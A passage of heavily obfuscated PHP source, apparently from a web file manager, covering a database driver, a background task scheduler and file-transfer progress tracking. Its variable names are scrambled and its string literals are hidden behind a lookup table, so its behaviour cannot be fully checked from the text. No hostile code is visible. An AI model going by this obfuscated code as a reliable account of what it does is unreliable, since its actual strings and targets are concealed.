$∆ÌåÚ®Ü); } } public function close() { $this->_linkID = null; } public function error() { $±ÓÕ÷Îî =& $_SERVER[Çâä∆◊¡]; if ($this->PDOStatement) { $ˆŸﬁ⁄Ÿß = $this->PDOStatement->errorInfo(); $this->error = $ˆŸﬁ⁄Ÿß[1] . $±ÓÕ÷Îî[4] . $ˆŸﬁ⁄Ÿß[2]; } else { $this->error = $±ÓÕ÷Îî[12]; } if ($±ÓÕ÷Îî[12] != $this->queryStr) { $this->error .= LNG($±ÓÕ÷Îî[48]) . $this->queryStr; } think_trace($this->error, $±ÓÕ÷Îî[12], $±ÓÕ÷Îî[49]); return $this->error; } public function escapeString($ˆçæΩ’Õ) { $∏Ñ¬®…ä =& $_SERVER[Çâä∆◊¡]; switch ($this->dbType) { case $∏Ñ¬®…ä[931]: case $∏Ñ¬®…ä[904]: case $∏Ñ¬®…ä[922]: case $∏Ñ¬®…ä[934]: return addslashes($ˆçæΩ’Õ); case $∏Ñ¬®…ä[906]: case $∏Ñ¬®…ä[923]: case $∏Ñ¬®…ä[905]: case $∏Ñ¬®…ä[907]: return str_ireplace($∏Ñ¬®…ä[58], $∏Ñ¬®…ä[59], $ˆçæΩ’Õ); } } protected function parseValue($’Ò·≤•Ä) { $˚ƒÇû‘› =& $_SERVER[Çâä∆◊¡]; if (is_string($’Ò·≤•Ä)) { $µ„Ñ‰àè = strpos($’Ò·≤•Ä, $˚ƒÇû‘›[4]) === 0 && in_array($’Ò·≤•Ä, array_keys($this->bind)); $’Ò·≤•Ä = $µ„Ñ‰àè ? $this->escapeString($’Ò·≤•Ä) : $˚ƒÇû‘›[944] . $this->escapeString($’Ò·≤•Ä) . $˚ƒÇû‘›[944]; } elseif (isset($’Ò·≤•Ä[0]) && is_string($’Ò·≤•Ä[0]) && strtolower($’Ò·≤•Ä[0]) == $˚ƒÇû‘›[292]) { $’Ò·≤•Ä = $this->escapeString($’Ò·≤•Ä[1]); } elseif (is_array($’Ò·≤•Ä)) { $’Ò·≤•Ä = array_map(array($this, $˚ƒÇû‘›[945]), $’Ò·≤•Ä); } elseif (is_bool($’Ò·≤•Ä)) { $’Ò·≤•Ä = $’Ò·≤•Ä ? $˚ƒÇû‘›[89] : $˚ƒÇû‘›[190]; } elseif (is_null($’Ò·≤•Ä)) { $’Ò·≤•Ä = $˚ƒÇû‘›[104]; } return $’Ò·≤•Ä; } public function getLastInsertId() { $‰¬≈¿ˆÿ =& $_SERVER[Çâä∆◊¡]; switch ($this->dbType) { case $‰¬≈¿ˆÿ[931]: case $‰¬≈¿ˆÿ[923]: case $‰¬≈¿ˆÿ[904]: case $‰¬≈¿ˆÿ[922]: case $‰¬≈¿ˆÿ[906]: case $‰¬≈¿ˆÿ[934]: return $this->_linkID->lastInsertId(); case $‰¬≈¿ˆÿ[905]: case $‰¬≈¿ˆÿ[907]: $ˆ®ëãöô = $this->table; $Ÿªäôù = $this->query("\x53\105\x4c\x45\103\124\x20{$ˆ®ëãöô}\x2e\143\x75\x72\x72\x76\x61\x6c\40\x63\x75\162\x72\166\x61\x6c\40\106\x52\117\115\40\x64\x75\x61\154"); return $Ÿªäôù ? $Ÿªäôù[0][$‰¬≈¿ˆÿ[946]] : 0; } } } goto F⁄∆™Û” è; eï¢”ñ∑Ï∂: class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { $˙ªÕÙ´Õ =& $_SERVER[Çâä∆◊¡]; if (self::valueGet($˙ªÕÙ´Õ[743]) != $˙ªÕÙ´Õ[89]) { return; } if (self::valueGet($˙ªÕÙ´Õ[1602]) == $˙ªÕÙ´Õ[89]) { $…ÈÃüÕ∞ = self::valueGet($˙ªÕÙ´Õ[1603]); if (time() - $…ÈÃüÕ∞ > self::AUTO_RESTART_TIME) { self::restart(); } return; } http_close(); self::valueSet($˙ªÕÙ´Õ[1602], $˙ªÕÙ´Õ[89]); self::log($˙ªÕÙ´Õ[1604]); Hook::bind($˙ªÕÙ´Õ[1605], $˙ªÕÙ´Õ[1606]); $›™Ô¢˙¯ = 0; while (!0) { self::cacheClear(); if (self::valueGet($˙ªÕÙ´Õ[743]) != $˙ªÕÙ´Õ[89]) { self::valueSet($˙ªÕÙ´Õ[1602], $˙ªÕÙ´Õ[190]); self::log($˙ªÕÙ´Õ[1607]); die; } $±¬Îÿ’∆ = time(); if ($±¬Îÿ’∆ - $›™Ô¢˙¯ >= 60) { self::valueSet(array($˙ªÕÙ´Õ[1602] => $˙ªÕÙ´Õ[89], $˙ªÕÙ´Õ[1603] => $±¬Îÿ’∆), !1); $›™Ô¢˙¯ = $±¬Îÿ’∆; } if (!file_exists(USER_SYSTEM . $˙ªÕÙ´Õ[1608])) { self::valueSet(array($˙ªÕÙ´Õ[1602] => $˙ªÕÙ´Õ[190], $˙ªÕÙ´Õ[743] => $˙ªÕÙ´Õ[190]), !1); self::log($˙ªÕÙ´Õ[1609]); die; } self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } } public static function restart() { $’ÌºŸêº =& $_SERVER[Çâä∆◊¡]; http_close(); self::valueSet($’ÌºŸêº[743], $’ÌºŸêº[190]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet(array($’ÌºŸêº[1602] => $’ÌºŸêº[190], $’ÌºŸêº[743] => $’ÌºŸêº[89]), !1); } public static function shutdownEvent() { $ò≠⁄¸®í =& $_SERVER[Çâä∆◊¡]; self::valueSet($ò≠⁄¸®í[1602], $ò≠⁄¸®í[190]); self::log($ò≠⁄¸®í[1610]); } public static function config($⁄Ÿù∞˘¨, $¿ÄÑ˜ø£) { self::valueSet($_SERVER[Çâä∆◊¡][743], $⁄Ÿù∞˘¨); } private static function taskRunAll() { $Ê¿«ΩÁ˛ =& $_SERVER[Çâä∆◊¡]; $∫Ñ∫ø¢´ = timeFloat(); $„œÑ¬√Ó = Model($Ê¿«ΩÁ˛[1611])->listData(); $®¢ªˆ›” = count($„œÑ¬√Ó); for ($á∂ˆìÉï = 0; $á∂ˆìÉï < $®¢ªˆ›”; $á∂ˆìÉï++) { $˝Í≠‡Äï = $„œÑ¬√Ó[$á∂ˆìÉï]; if (!$˝Í≠‡Äï[$Ê¿«ΩÁ˛[401]] || $˝Í≠‡Äï[$Ê¿«ΩÁ˛[1612]] != $Ê¿«ΩÁ˛[89]) { continue; } if (!self::taskTimeCheck($˝Í≠‡Äï)) { continue; } self::taskRun($˝Í≠‡Äï); } Hook::trigger($Ê¿«ΩÁ˛[1613]); self::taskQueueRun($∫Ñ∫ø¢´); } private static function taskQueueRun($·ãß≥‹â) { $÷¢öŸüÈ = 10; while (!0) { $œÅÛ î¿ = TaskQueue::run(); if ($œÅÛ î¿ === !1) { break; } if (timeFloat() - $·ãß≥‹â >= $÷¢öŸüÈ) { break; } } } private static function taskTimeCheck($‘çéÅçÒ) { $∫‹¿–À≤ =& $_SERVER[Çâä∆◊¡]; $ò…§Ó¿Ì = json_decode($‘çéÅçÒ[$∫‹¿–À≤[196]], !0); $†ô∆ËÿÂ = intval($‘çéÅçÒ[$∫‹¿–À≤[1603]]); $§ÿﬁ˘Û± = strtotime($∫‹¿–À≤[1614] . $ò…§Ó¿Ì[$∫‹¿–À≤[1615]] . $∫‹¿–À≤[1616]) - strtotime($∫‹¿–À≤[1617]); $≠ÍﬂÔ˚ = time() - strtotime(date($∫‹¿–À≤[1618]) . $∫‹¿–À≤[1619]); $˙ı‹öœ´ = $≠ÍﬂÔ˚ >= $§ÿﬁ˘Û± && $≠ÍﬂÔ˚ <= $§ÿﬁ˘Û± + 3600; switch ($ò…§Ó¿Ì[$∫‹¿–À≤[33]]) { case $∫‹¿–À≤[1620]: if (time() - $†ô∆ËÿÂ < 3600 * 24 * 30) { return !1; } if ($ò…§Ó¿Ì[$∫‹¿–À≤[1620]] == date($∫‹¿–À≤[1621]) && $˙ı‹öœ´) { return !0; } break; case $∫‹¿–À≤[1622]: if (time() - $†ô∆ËÿÂ < 3600 * 24 * 7) { return !1; } $ÖÓò¿í◊ = date($∫‹¿–À≤[1623]) == 0 ? 7 : date($∫‹¿–À≤[1623]); if ($ò…§Ó¿Ì[$∫‹¿–À≤[1622]] == $ÖÓò¿í◊ && $˙ı‹öœ´) { return !0; } break; case $∫‹¿–À≤[1615]: if (time() - $†ô∆ËÿÂ < 3600 * 24) { return !1; } if ($˙ı‹öœ´) { return !0; } break; case $∫‹¿–À≤[1624]: if (time() - $†ô∆ËÿÂ >= floatval($ò…§Ó¿Ì[$∫‹¿–À≤[1624]]) * 60) { return !0; } break; default: break; } return !1; } private static function closeDatabase() { $√´Û£À≥ =& $_SERVER[Çâä∆◊¡]; static $¶π‘ìÄã = 0; $Ùù∏ﬂ√† = 300; if (!$¶π‘ìÄã) { $¶π‘ìÄã = time(); } if (time() - $¶π‘ìÄã < $Ùù∏ﬂ√†) { return; } $¶π‘ìÄã = time(); $µàº‡ûÑ = Model($√´Û£À≥[513])->db($√´Û£À≥[12]); if ($µàº‡ûÑ) { $µàº‡ûÑ->closeConnect(); } if (time() - TIME > 3600 * 24 * 3) { self::log($√´Û£À≥[1625], $√´Û£À≥[1626]); die; } } public static function taskRun($˝À¶ßã) { $Œ‘⁄Ê»÷ =& $_SERVER[Çâä∆◊¡]; self::log($Œ‘⁄Ê»÷[1627] . $˝À¶ßã[$Œ‘⁄Ê»÷[401]] . $Œ‘⁄Ê»÷[1628] . $˝À¶ßã[$Œ‘⁄Ê»÷[32]] . $Œ‘⁄Ê»÷[1629] . $˝À¶ßã[$Œ‘⁄Ê»÷[1630]]); Model($Œ‘⁄Ê»÷[1611])->run($˝À¶ßã[$Œ‘⁄Ê»÷[401]]); $Ä‚‚˜å· = timeFloat(); $ô„ﬂ Åº = $Œ‘⁄Ê»÷[12]; switch ($˝À¶ßã[$Œ‘⁄Ê»÷[33]]) { case $Œ‘⁄Ê»÷[302]: $Üë˚ö›Ä = url_request($˝À¶ßã[$Œ‘⁄Ê»÷[1630]], $Œ‘⁄Ê»÷[225], !1, !1, !1, !1, 10); if ($Üë˚ö›Ä[$Œ‘⁄Ê»÷[743]]) { $ô„ﬂ Åº = strlen($Üë˚ö›Ä[$Œ‘⁄Ê»÷[1178]]); } break; case $Œ‘⁄Ê»÷[224]: $ô„ﬂ Åº = Hook::apply($˝À¶ßã[$Œ‘⁄Ê»÷[1630]]); default: break; } Model($Œ‘⁄Ê»÷[1631])->add(array($Œ‘⁄Ê»÷[1632] => $Œ‘⁄Ê»÷[12], $Œ‘⁄Ê»÷[1633] => $Œ‘⁄Ê»÷[190], $Œ‘⁄Ê»÷[33] => $Œ‘⁄Ê»÷[1634] . $˝À¶ßã[$Œ‘⁄Ê»÷[401]], $Œ‘⁄Ê»÷[1635] => json_encode(array($Œ‘⁄Ê»÷[32] => $˝À¶ßã[$Œ‘⁄Ê»÷[32]], $Œ‘⁄Ê»÷[1636] => timeFloat() - $Ä‚‚˜å·, $Œ‘⁄Ê»÷[288] => $ô„ﬂ Åº)))); $úêÃÚ†¸ = $ô„ﬂ Åº ? $Œ‘⁄Ê»÷[1637] . $ô„ﬂ Åº : $Œ‘⁄Ê»÷[12]; self::log($Œ‘⁄Ê»÷[1638] . $˝À¶ßã[$Œ‘⁄Ê»÷[401]] . $Œ‘⁄Ê»÷[536] . $úêÃÚ†¸); return !0; } private static function valueGet($‡”ûìÄ˝) { $ü√£óß =& $_SERVER[Çâä∆◊¡]; $„¥ÖÉï˜ = $ü√£óß[1639]; $™∆µÄÚ¡ = Model($ü√£óß[433])->get($‡”ûìÄ˝, $„¥ÖÉï˜); if (is_null($™∆µÄÚ¡)) { Model($ü√£óß[433])->set($ü√£óß[743], $ü√£óß[89], $„¥ÖÉï˜); Model($ü√£óß[433])->set($ü√£óß[1602], $ü√£óß[190], $„¥ÖÉï˜); $™∆µÄÚ¡ = Model($ü√£óß[433])->get($‡”ûìÄ˝, $„¥ÖÉï˜); } return $™∆µÄÚ¡; } private static function valueSet($∫È˚ùŸº, $‰¢Ÿõ◊µ) { $˛‚˚≥œÍ =& $_SERVER[Çâä∆◊¡]; $∆Â´èÉÅ = $˛‚˚≥œÍ[1640]; CacheLock::lock($∆Â´èÉÅ); $¢ã€Ú∂° = Model($˛‚˚≥œÍ[433])->set($∫È˚ùŸº, $‰¢Ÿõ◊µ, $˛‚˚≥œÍ[1639]); CacheLock::unlock($∆Â´èÉÅ); return $¢ã€Ú∂°; } protected static function log($·√á≈÷Ñ) { write_log($·√á≈÷Ñ, $_SERVER[Çâä∆◊¡][1626]); } private static function cacheClear() { $ÀÔ’Î¢å =& $_SERVER[Çâä∆◊¡]; Cache::clearMemory(Model($ÀÔ’Î¢å[433])->cacheKey($ÀÔ’Î¢å[1639])); Cache::clearMemory(Model($ÀÔ’Î¢å[433])->cacheKey($ÀÔ’Î¢å[1641])); Model($ÀÔ’Î¢å[1611])->cacheClear(); self::closeDatabase(); } } class Task { const STATYS_STOP = "\163\x74\x6f\160"; const STATYS_RUNNING = "\x72\165\x6e\x6e\151\x6e\147"; const STATYS_KILL = "\153\151\154\x6c"; public $task; public function __destruct() { $this->end(); } public function __construct($˜·∫ÿ, $¬‘∏ÅÅ¶ = '', $Ä¶√û⁄• = 0, $⁄ÙÜÈü≤ = '') { $Ù§ÛÔØÁ =& $_SERVER[Çâä∆◊¡]; if (self::get($˜·∫ÿ)) { return; } $this->task = array($Ù§ÛÔØÁ[401] => $˜·∫ÿ, $Ù§ÛÔØÁ[1642] => USER_ID, $Ù§ÛÔØÁ[1539] => $⁄ÙÜÈü≤, $Ù§ÛÔØÁ[33] => $¬‘∏ÅÅ¶, $Ù§ÛÔØÁ[1051] => $Ù§ÛÔØÁ[12], $Ù§ÛÔØÁ[779] => $Ä¶√û⁄•, $Ù§ÛÔØÁ[1643] => 0, $Ù§ÛÔØÁ[1644] => 0, $Ù§ÛÔØÁ[1645] => 0, $Ù§ÛÔØÁ[1646] => timeFloat(), $Ù§ÛÔØÁ[1647] => 0, $Ù§ÛÔØÁ[1648] => 0, $Ù§ÛÔØÁ[1649] => 0, $Ù§ÛÔØÁ[1650] => 0, $Ù§ÛÔØÁ[743] => $Ù§ÛÔØÁ[1602]); $GLOBALS[$Ù§ÛÔØÁ[1651]] = 1; Hook::bind($Ù§ÛÔØÁ[1605], array($this, $Ù§ÛÔØÁ[1652])); Hook::bind($Ù§ÛÔØÁ[1653], array($this, $Ù§ÛÔØÁ[1654])); $this->startAfter(); Hook::trigger($Ù§ÛÔØÁ[1655], $this->task); $this->task[$Ù§ÛÔØÁ[1648]] = timeFloat(); } public function end() { $ï‘ŸÖÊÈ =& $_SERVER[Çâä∆◊¡]; if (!$this->task) { return; } if ($this->task[$ï‘ŸÖÊÈ[1648]]) { self::valueSet($this->task[$ï‘ŸÖÊÈ[401]], !1); } $∫≈∞ÇÁµ = timeFloat() - $this->task[$ï‘ŸÖÊÈ[1646]]; self::log($ï‘ŸÖÊÈ[1656] . $this->task[$ï‘ŸÖÊÈ[401]] . $ï‘ŸÖÊÈ[1657] . $∫≈∞ÇÁµ . $ï‘ŸÖÊÈ[1658]); Hook::unbind($ï‘ŸÖÊÈ[1605], array($this, $ï‘ŸÖÊÈ[1652])); Hook::unbind($ï‘ŸÖÊÈ[1653], array($this, $ï‘ŸÖÊÈ[1654])); $this->endAfter(); $this->task = !1; } public function update($À∫íÈ˚ = 0, $¿¬™¶‘Ç = false) { $ﬂ˘óøÍâ =& $_SERVER[Çâä∆◊¡]; $•˘¥‰¿† =& $this->task; if (!$•˘¥‰¿†) { return; } $•˘¥‰¿†[$ﬂ˘óøÍâ[1643]] += $À∫íÈ˚; $•˘¥‰¿†[$ﬂ˘óøÍâ[1647]] = timeFloat(); if ($•˘¥‰¿†[$ﬂ˘óøÍâ[779]]) { if ($•˘¥‰¿†[$ﬂ˘óøÍâ[779]] < $•˘¥‰¿†[$ﬂ˘óøÍâ[1643]]) { $•˘¥‰¿†[$ﬂ˘óøÍâ[779]] = $•˘¥‰¿†[$ﬂ˘óøÍâ[1643]]; } $Æ´ œ©¡ = timeFloat() - $•˘¥‰¿†[$ﬂ˘óøÍâ[1646]] - $•˘¥‰¿†[$ﬂ˘óøÍâ[1649]]; $•˘¥‰¿†[$ﬂ˘óøÍâ[1644]] = $•˘¥‰¿†[$ﬂ˘óøÍâ[1643]] / $•˘¥‰¿†[$ﬂ˘óøÍâ[779]]; $•˘¥‰¿†[$ﬂ˘óøÍâ[1645]] = $•˘¥‰¿†[$ﬂ˘óøÍâ[1643]] / $Æ´ œ©¡; if ($•˘¥‰¿†[$ﬂ˘óøÍâ[1644]] > 0) { $•˘¥‰¿†[$ﬂ˘óøÍâ[1650]] = $Æ´ œ©¡ * (1 - $•˘¥‰¿†[$ﬂ˘óøÍâ[1644]]) / $•˘¥‰¿†[$ﬂ˘óøÍâ[1644]]; } $•˘¥‰¿†[$ﬂ˘óøÍâ[1650]] = $•˘¥‰¿†[$ﬂ˘óøÍâ[1650]] <= 0 ? 0 : $•˘¥‰¿†[$ﬂ˘óøÍâ[1650]]; } $this->updateAfter(); $ÅË‡—›Ã = 0.2; if (timeFloat() - $•˘¥‰¿†[$ﬂ˘óøÍâ[1648]] < $ÅË‡—›Ã && !$¿¬™¶‘Ç) { return; } $ÃÃ€º®í = self::get($•˘¥‰¿†[$ﬂ˘óøÍâ[401]]); $»é·…™û = $ÃÃ€º®í[$ﬂ˘óøÍâ[743]]; if ($»é·…™û == self::STATYS_KILL) { $Ô„Â˙ªÎ = array($ﬂ˘óøÍâ[1659] => LNG($ﬂ˘óøÍâ[1660]), $ﬂ˘óøÍâ[1176] => !1); Cache::set($ﬂ˘óøÍâ[1661] . $this->task[$ﬂ˘óøÍâ[401]], $Ô„Â˙ªÎ, 30); $this->onKill(); $this->end(); die; } else { if ($»é·…™û == self::STATYS_STOP) { $Å¶çë£Ì = 2; $ÃÃ€º®í[$ﬂ˘óøÍâ[1649]] += $Å¶çë£Ì; self::valueSet($•˘¥‰¿†[$ﬂ˘óøÍâ[401]], $ÃÃ€º®í); sleep($Å¶çë£Ì); $this->update(); return; } } $•˘¥‰¿†[$ﬂ˘óøÍâ[743]] = $»é·…™û ? $»é·…™û : $•˘¥‰¿†[$ﬂ˘óøÍâ[743]]; $•˘¥‰¿†[$ﬂ˘óøÍâ[1649]] = $ÃÃ€º®í[$ﬂ˘óøÍâ[1649]] ? $ÃÃ€º®í[$ﬂ˘óøÍâ[1649]] : 0; $•˘¥‰¿†[$ﬂ˘óøÍâ[1648]] = timeFloat(); Hook::trigger($ﬂ˘óøÍâ[1662], $•˘¥‰¿†); self::valueSet($•˘¥‰¿†[$ﬂ˘óøÍâ[401]], $•˘¥‰¿†); } public function onKillSet($°†˝∫”Ê, $„öØÖΩë = array()) { $this->onKillCall = array($°†˝∫”Ê, $„öØÖΩë); } public function onKill() { $ãâÆÙÓ“ =& $_SERVER[Çâä∆◊¡]; self::log($ãâÆÙÓ“[1656] . $this->task[$ãâÆÙÓ“[401]] . $ãâÆÙÓ“[1663]); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($˚–∑Á‹Ü) { $Øü®˝µÌ =& $_SERVER[Çâä∆◊¡]; Cache::set($Øü®˝µÌ[1661] . $this->task[$Øü®˝µÌ[401]], $˚–∑Á‹Ü, 60); return $˚–∑Á‹Ü; } public static function get($ÕÃèí—¡) { $ù˙”≠™Ó =& $_SERVER[Çâä∆◊¡]; $£úΩàéø = self::valueGet($ÕÃèí—¡); if (is_array($£úΩàéø) && $£úΩàéø[$ù˙”≠™Ó[1664]]) { $èÀ ®ï´ = ActionApply($£úΩàéø[$ù˙”≠™Ó[1664]], array($£úΩàéø)); $£úΩàéø = is_array($èÀ ®ï´) ? $èÀ ®ï´ : $£úΩàéø; } return $£úΩàéø; } public static function listData() { $Êúå˘É  = self::valueGet(); return array_sort_by($Êúå˘É , $_SERVER[Çâä∆◊¡][1646], !0); } public static function kill($•ÇÊ¸„Å) { return self::changeStatus($•ÇÊ¸„Å, self::STATYS_KILL); } public static function stop($ü˛ÂŸÕí) { return self::changeStatus($ü˛ÂŸÕí, self::STATYS_STOP); } public static function restart($∆ö„‚ß⁄) { return self::changeStatus($∆ö„‚ß⁄, self::STATYS_RUNNING); } public static function killAll() { $Ñò°áÄΩ =& $_SERVER[Çâä∆◊¡]; $Õé¨£ÿà = self::listData(); foreach ($Õé¨£ÿà as $Ø˘•¿õ≥) { self::kill($Ø˘•¿õ≥[$Ñò°áÄΩ[401]]); } sleep(2); foreach ($Õé¨£ÿà as $Ø˘•¿õ≥) { self::valueSet($Ø˘•¿õ≥[$Ñò°áÄΩ[401]], !1); } } private static function changeStatus($øò‚÷∑Ñ, $É∂Ì∫õ˘) { $∆ñ∑¸›§ =& $_SERVER[Çâä∆◊¡]; $”˜˛›ƒ = self::valueGet($øò‚÷∑Ñ); if (!$”˜˛›ƒ) { return !1; } $”˜˛›ƒ[$∆ñ∑¸›§[743]] = $É∂Ì∫õ˘; self::valueSet($øò‚÷∑Ñ, $”˜˛›ƒ); self::log($∆ñ∑¸›§[1665] . $”˜˛›ƒ[$∆ñ∑¸›§[401]] . $∆ñ∑¸›§[1666] . $É∂Ì∫õ˘); return !0; } public static function valueGet($ÜäãÛﬂÔ = false) { $˜ô„‹ÄÄ =& $_SERVER[Çâä∆◊¡]; if ($ÜäãÛﬂÔ) { $Á‘∆ª°É = Model($˜ô„‹ÄÄ[445])->where(array($˜ô„‹ÄÄ[95] => $ÜäãÛﬂÔ, $˜ô„‹ÄÄ[33] => $˜ô„‹ÄÄ[1058]))->find(); return $Á‘∆ª°É ? json_decode($Á‘∆ª°É[$˜ô„‹ÄÄ[369]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($¥ÅÉŸ¥» = false) { $©®æ˜œò =& $_SERVER[Çâä∆◊¡]; $øØÜÿúÅ = array($©®æ˜œò[33] => $©®æ˜œò[1058]); if ($¥ÅÉŸ¥») { $øØÜÿúÅ[$©®æ˜œò[1642]] = $¥ÅÉŸ¥»; } $ÄÉ®ø ◊ = Model($©®æ˜œò[445])->where($øØÜÿúÅ)->select(); $ÄÉ®ø ◊ = $ÄÉ®ø ◊ ? $ÄÉ®ø ◊ : array(); foreach ($ÄÉ®ø ◊ as $π˛ò±“ä => $∆¥Ù¢âÁ) { $ÄÉ®ø ◊[$π˛ò±“ä] = json_decode($∆¥Ù¢âÁ[$©®æ˜œò[369]], !0); } return $ÄÉ®ø ◊; } public static function valueSet($Ω–õúí›, $øÊ¢º∏ë) { $”ùÍìªÊ =& $_SERVER[Çâä∆◊¡]; if (!$øÊ¢º∏ë) { return Model($”ùÍìªÊ[445])->where(array($”ùÍìªÊ[95] => $Ω–õúí›, $”ùÍìªÊ[33] => $”ùÍìªÊ[1058]))->delete(); } $‹’ï¬›Ò = json_encode($øÊ¢º∏ë); if (!$‹’ï¬›Ò) { ob_start(); var_dump($øÊ¢º∏ë); $œ˙˘ÁÄÓ = ob_get_clean(); self::log($”ùÍìªÊ[1667] . json_encode_force($œ˙˘ÁÄÓ)); } if (!$Ω–õúí› || !$øÊ¢º∏ë[$”ùÍìªÊ[401]]) { return !1; } $µ∑¶ï∑ë = array($”ùÍìªÊ[33] => $”ùÍìªÊ[1058], $”ùÍìªÊ[1642] => USER_ID, $”ùÍìªÊ[95] => $Ω–õúí›, $”ùÍìªÊ[369] => $‹’ï¬›Ò); $≥Õ£ ﬁ… = $”ùÍìªÊ[1668]; CacheLock::lock($≥Õ£ ﬁ…); Model($”ùÍìªÊ[445])->add($µ∑¶ï∑ë, array(), !0); CacheLock::unlock($≥Õ£ ﬁ…); } public static function log($Ââ±Æï˜) { if (!GLOBAL_DEBUG) { return; } write_log($Ââ±Æï˜, $_SERVER[Çâä∆◊¡][1669]); } } class TaskFileTransfer extends Task { protected function startAfter() { $À…ÄÆ»˙ =& $_SERVER[Çâä∆◊¡]; $»Èº◊˘∆ =& $this->task; $this->sourceCopyFolder = !1; Hook::bind($À…ÄÆ»˙[1670], array($this, $À…ÄÆ»˙[1671])); Hook::bind($À…ÄÆ»˙[1200], array($this, $À…ÄÆ»˙[1672])); Hook::bind($À…ÄÆ»˙[1673], array($this, $À…ÄÆ»˙[1674])); Hook::bind($À…ÄÆ»˙[598], array($this, $À…ÄÆ»˙[1675])); Hook::bind($À…ÄÆ»˙[599], array($this, $À…ÄÆ»˙[1676])); Hook::bind($À…ÄÆ»˙[601], array($this, $À…ÄÆ»˙[1677])); Hook::bind($À…ÄÆ»˙[602], array($this, $À…ÄÆ»˙[1677])); Hook::bind($À…ÄÆ»˙[568], array($this, $À…ÄÆ»˙[1678])); Hook::bind($À…ÄÆ»˙[565], array($this, $À…ÄÆ»˙[1678])); Hook::bind($À…ÄÆ»˙[570], array($this, $À…ÄÆ»˙[1678])); Hook::bind($À…ÄÆ»˙[572], array($this, $À…ÄÆ»˙[1678])); Hook::bind($À…ÄÆ»˙[574], array($this, $À…ÄÆ»˙[1678])); Hook::bind($À…ÄÆ»˙[1679], array($this, $À…ÄÆ»˙[1680])); Hook::bind($À…ÄÆ»˙[591], array($this, $À…ÄÆ»˙[1681])); $this->sourceModelCopyFlag = !1; Hook::bind($À…ÄÆ»˙[1682], array($this, $À…ÄÆ»˙[1683])); Hook::bind($À…ÄÆ»˙[1684], array($this, $À…ÄÆ»˙[1685])); Hook::bind($À…ÄÆ»˙[1686], array($this, $À…ÄÆ»˙[1687])); $»Èº◊˘∆[$À…ÄÆ»˙[1688]] = LNG($À…ÄÆ»˙[1689]); $»Èº◊˘∆[$À…ÄÆ»˙[1690]] = 0; $»Èº◊˘∆[$À…ÄÆ»˙[1691]] = 0; $»Èº◊˘∆[$À…ÄÆ»˙[1051]] = $À…ÄÆ»˙[12]; $»Èº◊˘∆[$À…ÄÆ»˙[1692]] = $À…ÄÆ»˙[12]; $»Èº◊˘∆[$À…ÄÆ»˙[1693]] = 0; $»Èº◊˘∆[$À…ÄÆ»˙[1694]] = 0; $»Èº◊˘∆[$À…ÄÆ»˙[1695]] = 0; if (!$»Èº◊˘∆[$À…ÄÆ»˙[1539]]) { $»Èº◊˘∆[$À…ÄÆ»˙[1539]] = LNG($À…ÄÆ»˙[1696]); } } protected function endAfter() { $àÓœûûò =& $_SERVER[Çâä∆◊¡]; Hook::unbind($àÓœûûò[1670], array($this, $àÓœûûò[1671])); Hook::unbind($àÓœûûò[1200], array($this, $àÓœûûò[1672])); Hook::unbind($àÓœûûò[1673], array($this, $àÓœûûò[1674])); Hook::unbind($àÓœûûò[598], array($this, $àÓœûûò[1675])); Hook::unbind($àÓœûûò[599], array($this, $àÓœûûò[1676])); Hook::unbind($àÓœûûò[601], array($this, $àÓœûûò[1677])); Hook::unbind($àÓœûûò[602], array($this, $àÓœûûò[1677])); Hook::unbind($àÓœûûò[568], array($this, $àÓœûûò[1678])); Hook::unbind($àÓœûûò[565], array($this, $àÓœûûò[1678])); Hook::unbind($àÓœûûò[570], array($this, $àÓœûûò[1678])); Hook::unbind($àÓœûûò[572], array($this, $àÓœûûò[1678])); Hook::unbind($àÓœûûò[574], array($this, $àÓœûûò[1678])); Hook::unbind($àÓœûûò[1679], array($this, $àÓœûûò[1680])); Hook::unbind($àÓœûûò[591], array($this, $àÓœûûò[1681])); Hook::unbind($àÓœûûò[1682], array($this, $àÓœûûò[1683])); Hook::unbind($àÓœûûò[1684], array($this, $àÓœûûò[1685])); Hook::unbind($àÓœûûò[1686], array($this, $àÓœûûò[1687])); } public function copyMoveStart($Â¸…˝ËÔ, $Å˜ìßµ§, $œ ãè∏¨, $ƒ≤Ü›‡Ã) { $åÅ“∂Ã˜ =& $_SERVER[Çâä∆◊¡]; self::log($åÅ“∂Ã˜[1697] . $Å˜ìßµ§ . $åÅ“∂Ã˜[70] . $ƒ≤Ü›‡Ã); $í†©ı⁄ƒ = rtrim(TEMP_FILES, $åÅ“∂Ã˜[8]); if (substr($Å˜ìßµ§, 0, strlen($í†©ı⁄ƒ)) == $í†©ı⁄ƒ) { return; } if (substr($ƒ≤Ü›‡Ã, 0, strlen($í†©ı⁄ƒ)) == $í†©ı⁄ƒ) { return; } $ÌÇ√ﬁÃñ =& $this->task; $ÌÇ√ﬁÃñ[$åÅ“∂Ã˜[1698]] = KodIO::transferType($Â¸…˝ËÔ, $œ ãè∏¨); $this->update(); } public function updateAfter() { $ìù¡ÒŸÕ =& $_SERVER[Çâä∆◊¡]; $ ¢ÿ»êÃ =& $this->task; if (!$ ¢ÿ»êÃ[$ìù¡ÒŸÕ[756]]) { return; } if ($this->sourceModelCopyFlag) { return; } if ($ ¢ÿ»êÃ[$ìù¡ÒŸÕ[1698]] == $ìù¡ÒŸÕ[1289]) { return; } self::updateTask($ ¢ÿ»êÃ); } private static function updateTask(&$œ∂Å¸µˆ) { $≈ÖèÖ»Æ =& $_SERVER[Çâä∆◊¡]; if ($œ∂Å¸µˆ[$≈ÖèÖ»Æ[1698]] == $≈ÖèÖ»Æ[1184] || $œ∂Å¸µˆ[$≈ÖèÖ»Æ[1698]] == $≈ÖèÖ»Æ[108]) { if ($œ∂Å¸µˆ[$≈ÖèÖ»Æ[1692]]) { $œ∂Å¸µˆ[$≈ÖèÖ»Æ[1695]] = $œ∂Å¸µˆ[$≈ÖèÖ»Æ[1694]] + $œ∂Å¸µˆ[$≈ÖèÖ»Æ[1691]]; } } else { if ($œ∂Å¸µˆ[$≈ÖèÖ»Æ[1698]] == $≈ÖèÖ»Æ[1290]) { if ($œ∂Å¸µˆ[$≈ÖèÖ»Æ[1692]] == $≈ÖèÖ»Æ[1184]) { 